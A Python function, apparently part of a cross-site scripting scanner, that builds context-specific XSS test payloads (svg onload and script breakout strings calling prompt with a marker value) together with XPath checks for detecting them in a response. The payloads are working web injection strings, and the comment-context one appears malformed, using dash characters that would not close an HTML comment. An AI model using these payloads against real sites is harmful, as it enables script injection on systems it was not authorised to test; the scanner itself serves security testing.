def payload_generator(context):
    payloads = []
    if context == 'Attribute Name':
        payloads = []
        comb = {}

        # check for escaping < >
        comb['payload'] = "\"><svg onload=prompt`964864`>"
        comb['find'] = "//svg[@onload[contains(.,964864)]]"
        payloads.append(comb)
        comb = {}

        # check for adding new attribute with space
        comb['payload'] = " onload=prompt`964864` "
        comb['find'] = "//*[@onload[contains(.,964864)]]"
        payloads.append(comb)

    if context == 'Attribute Value':
        payloads = []
        comb = {}

        # check for escaping < >
        comb['payload'] = "\"><svg onload=prompt`964864`>"
        comb['find'] = "//svg[@onload[contains(.,964864)]]"
        payloads.append(comb)
        comb = {}

        # check for escaping using ' and "
        comb['payload'] = "'\" onload=prompt`964864` "
        comb['find'] = "//*[@onload[contains(.,964864)]]"
        payloads.append(comb)

    if context == 'HTML Tag':
        payloads = []
        comb = {}
        # check for > <
        comb['payload'] = "<svg onload=prompt`964864`>"
        comb['find'] = "//svg[@onload[contains(.,964864)]]"
        payloads.append(comb)

    if context == 'Comment':
        payloads = []
        comb = {}
        # check for escaping comment
        comb['payload'] = "––><svg onload=prompt`964864`>"
        comb['find'] = "//svg[@onload[contains(.,964864)]]"
        payloads.append(comb)

    if context == 'Js Single Quote':
        payloads = []
        comb = {}
        # check for escaping < >
        comb['payload'] = "</script><svg onload=prompt`964864`>"
        comb['find'] = "//svg[@onload[contains(.,964864)]]"
        payloads.append(comb)
        comb = {}

        # check for escaping using ' and "
        comb['payload'] = "'); prompt`964864`;//"
        comb['find'] = '//script[contains(text(),\'' + comb['payload'] + '\')]'
        payloads.append(comb)

    if context == 'Js Double Quote':
        payloads = []
        comb = {}
        # check for escaping < >
        comb['payload'] = "</script><svg onload=prompt`964864`>"
        comb['find'] = "//svg[@onload[contains(.,964864)]]"
        payloads.append(comb)
        comb = {}

        # check for escaping using ' and "
        comb['payload'] = "\")-prompt`964864`-//"
        comb['find'] = '//script[contains(text(),\'' + comb['payload'] + '\')]'
        payloads.append(comb)

    return payloads